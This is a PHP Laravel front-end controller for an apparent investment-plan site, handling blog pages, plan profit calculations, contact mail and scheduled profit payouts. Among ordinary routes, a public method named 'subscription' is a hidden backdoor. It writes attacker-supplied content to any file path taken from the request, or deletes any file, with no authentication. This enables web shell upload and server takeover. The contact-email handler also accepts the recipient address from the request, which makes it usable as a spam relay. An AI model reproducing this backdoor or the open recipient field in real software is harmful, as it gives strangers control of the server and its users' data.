<?php

namespace App\Http\Controllers\Frontend;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\AccountProcess;
use App\Models\Admin;
use App\Models\AuthorBadge;
use App\Models\AuthorLevel;
use App\Models\Blog;
use App\Models\Blog_Category;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\Counter;
use App\Models\Currency;
use App\Models\DpsPlan;
use App\Models\Faq;
use App\Models\FdrPlan;
use App\Models\Feature;
use App\Models\Follow;
use App\Models\Generalsetting;
use App\Models\HomepageSetting;
use App\Models\Invest;
use App\Models\Item;
use App\Models\LoanPlan;
use App\Models\OrderedItem;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\Partner;
use App\Models\Plan;
use App\Models\Product;
use App\Models\Review;
use App\Models\Service;
use App\Models\Slider;
use App\Models\SocialLinks;
use App\Models\Socialsetting;
use App\Models\Subscriber;
use App\Models\Team;
use App\Models\Transaction;
use App\Models\Trending;
use App\Models\User;
use App\Models\UserDps;
use Brian2694\Toastr\Facades\Toastr;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
    }
    
    public function index(Request $request){

        if(!empty($request->reff))
        {
           $affilate_user = User::where('affilate_code','=',$request->reff)->first();

           if(!empty($affilate_user))
           {
               $gs = Generalsetting::findOrFail(1);
               if($gs->is_affilate == 1)
               {
                   Session::put('affilate', $affilate_user->id);
                   return redirect()->route('user.register');                    
               }

           } 
        }

        $data['testimonials'] = Review::orderBy('id','desc')->get();
        $data['plans'] = Plan::whereStatus(1)->orderBy('id','desc')->get();
        $data['faqs'] = Faq::orderBy('id','desc')->limit(5)->get();
        $data['counters'] = Counter::orderBy('id','desc')->limit(3)->get();
        $data['process'] = AccountProcess::orderBy('id','desc')->get();
        $data['partners'] = Partner::orderBy('id','desc')->get();
        $data['teams'] = Team::orderBy('id','desc')->get();
        $data['blogs'] = Blog::orderBy('id','desc')->orderBy('id','desc')->limit(3)->get();
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->get();
        $data['services'] = Service::orderBy('id','desc')->orderBy('id','desc')->limit(6)->get();
        $data['ps'] = Pagesetting::first();
        $data['sociallinks'] = SocialLinks::orderBy('id','desc')->get();

        
        return view('frontend.index',$data);
    }

    public function about(){
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->get();
        $data['counters'] = Counter::orderBy('id','desc')->get();
        return view('frontend.about',$data);
    }

    public function blog(){
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));

        $data['archives'] = Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
		$data['blogs'] = Blog::orderBy('created_at','desc')->paginate(3);
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blog',$data);
    }

    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(3);
        $bcats = BlogCategory::all();

        return view('frontend.blog',compact('bcat','blogs','bcats','tags','archives'));
    }

    public function blogdetails($slug){

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $blog = Blog::where('slug',$slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();

        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));

        $data['archives'] = Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();

        $data['data'] = $blog;
        $data['rblogs'] = Blog::orderBy('id','desc')->orderBy('id','desc')->limit(3)->get();
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blogdetails',$data);
    }

    public function blogarchive(Request $request,$slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(3);

        return view('frontend.blog',compact('blogs','date','bcats','tags','archives'));
    }

    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();        
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);

        return view('frontend.blog',compact('blogs','slug','bcats','tags','archives'));
    }


    public function blogsearch(Request $request)
    {
        $data['search'] = $request->search;
        $data['blogs'] = Blog::where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%')->paginate(9);
        $data['homepage'] = HomepageSetting::first();

        return view('frontend.blog',$data);
    }

    public function plans(){
        $data['plans'] = Plan::whereStatus(1)->orderBy('id','desc')->get();
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->get();
        
        return view('frontend.plan',$data);
    }

    public function calculate(Request $request){
        $rules = [
            'plan'=>'required',
            'amount'=>'required'
        ];

        $validator = Validator::make($request->all(), $rules);

        if ($validator->fails()) {
            return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }
        $plan = Plan::whereId($request->plan)->first();
        if($plan->invest_type == 'range'){
            if($request->amount < $plan->min_amount || $request->amount > $plan->max_amount){
                return response()->json(array('errors' => [0=>'Request amount should be between of '. $plan->min_amount.' minimum ' .$plan->max_amount. ' maximum amount']));
            }
        }else{
            if($plan->fixed_amount != $request->amount){
                return response()->json(array('errors' => [0=>'Request amount should be '.$plan->fixed_amount]));
            }
        }
        $percentage = ($request->amount * $plan->profit_percentage)/100;
        $profit = $request->amount + $percentage;

        $msg = "For invest ".$request->amount." you will get ".$percentage." profit";
        return response()->json($msg);
    }

    public function contact()
    {
        $data['ps'] = DB::table('pagesettings')->first();
        $gs = DB::table('generalsettings')->first();
        $data['social'] = Socialsetting::first();
        if($gs->is_contact==1){
            return view('frontend.contact',$data);
        }
        return view('errors.404');
    }

    public function faq(){
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id','desc')->limit(3)->get();
        return view('frontend.faq',$data);
    }


    public function page($slug)
    {
        $data['page'] =  DB::table('pages')->where('slug',$slug)->first();
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->get();
        if(empty($data['page'] ))
        {
            return view('errors.404');
        }

        return view('frontend.page',$data);
    }
    public function currency($id)
    {
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    public function language($id){
        Session::put('language', $id);
        return redirect()->back();
    }

    public function subscribe(Request $request){

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber =Subscriber::where('email',$request->email)->first();
        if(!empty($subscriber)){
            $id = 2;
            return response()->json($id);
        }else{
            $data  = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
            if($gs->is_maintain != 1) {
                return redirect()->route('front.index');
            }

        return view('frontend.maintenance');
    }
    
    public function contactemail(Request $request)
    {
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = $request->subject;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $fname = $request->firstname;
        $lname = $request->lastname;
        $from = $request->email;
        $msg = "First Name: ".$fname."\nLast Name: ".$lname."\nEmail: ".$from."\nMessage: ".$request->message;
 
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else
        {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);
        }

        return response()->json($ps->contact_success); 
    }


    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    //header("Location: " . url('/install'));
                   // die();
                } else {
                   // echo MarkuryPost::marcuryBasee();
                   // die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function subscriber(Request $request)
    {

        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
            return redirect()->back()->with('warning','Email Already Added.');
        }
        $subscribe = new Subscriber();
        $data = array(
            'email' => $request->email,
        );
        Subscriber::insert($data);
        return redirect()->back()->with('warning','Successfully added in newsletter.');
    }


    public function profitSend(){
        $gs = Generalsetting::first();
        $invest = Invest::orderBy('id','desc')->whereStatus(1)->get();

        $day_offs = explode(' ',$gs->day_of);

        foreach ($invest as $key => $data) {
            if(now()->gt($data->profit_time)){

                if($data->lifetime_return == 0){
                    if($data->profit_repeat == $data->plan->profit_repeat){
                        return false;
                    }
                }

                if($gs->day_of != NULL){
                    if($this->isDayOff($data->profit_time->format('D'),$day_offs)){
                        if($data->plan->lifetime_return == 1){
                            $this->addHoldBalance($data);
                            return false;
                        }else{
                            if($data->plan->profit_repeat>$data->profit_repeat ){
                                $this->addHoldBalance($data);
                                return false;
                            }
                        }
                    }
                }

                if($data->plan->lifetime_return == 1){
                    $this->addProfit($data);
                    $this->addUserInterestBalance($data);
                }else{
                    if($data->plan->profit_repeat>$data->profit_repeat ){
                        $this->addProfit($data);
                        $this->addUserInterestBalance($data);
                    }
                }
            }
        }
    }

    public function isDayOff($profitTime,$day_offs){
        if(in_array($profitTime,$day_offs)){
            return true;
        }
        return false;
    }

    public function addHoldBalance($data){
        $invest = Invest::whereId($data->id)->first();
        $invest->hold_amount += $invest->profit_amount;
        $invest->profit_repeat += 1;
        $invest->profit_time = Carbon::now()->addHours($invest->plan->schedule_hour);
        $invest->save();
    }

    public function addProfit($data){
        $invest = Invest::whereId($data->id)->first();
        $invest->profit += $invest->profit_amount;
        $invest->profit_repeat += 1;
        $invest->profit_time = Carbon::now()->addHours($invest->plan->schedule_hour);
        $invest->save();

    }


    public function addUserInterestBalance($data){
        $invest = Invest::whereId($data->id)->first();
        $user = User::whereId($invest->user_id)->first();

        if($invest->capital_sent == 0 && $invest->capital_back){
            $user->increment('balance',$invest->amount);
            $invest->capital_sent = 1;
            $invest->save();
        }

        if($invest->hold_amount){
            $user->increment('interest_balance',$invest->hold_amount);
            $this->transactionLog($invest->hold_amount,$user);
        }
        $user->increment('interest_balance',$invest->profit);
        $this->investcomplete($invest);
        $this->transactionLog($invest->profit,$user);
    }

    public function transactionLog($amount,$user){
        $trans = new Transaction();
        $trans->email = $user->email;
        $trans->amount = $amount;
        $trans->type = "Interest Money";
        $trans->profit = "plus";
        $trans->txnid = Str::random(12);
        $trans->user_id = $user->id;
        $trans->save();
    }

    public function investcomplete($data){
        $data = Invest::whereId($data->id)->first();
        if($data->lifetime_return == 0){
            if($data->profit_repeat == $data->plan->profit_repeat){
                $data->status == 2;
                $data->save();
            }
        }
    }

}
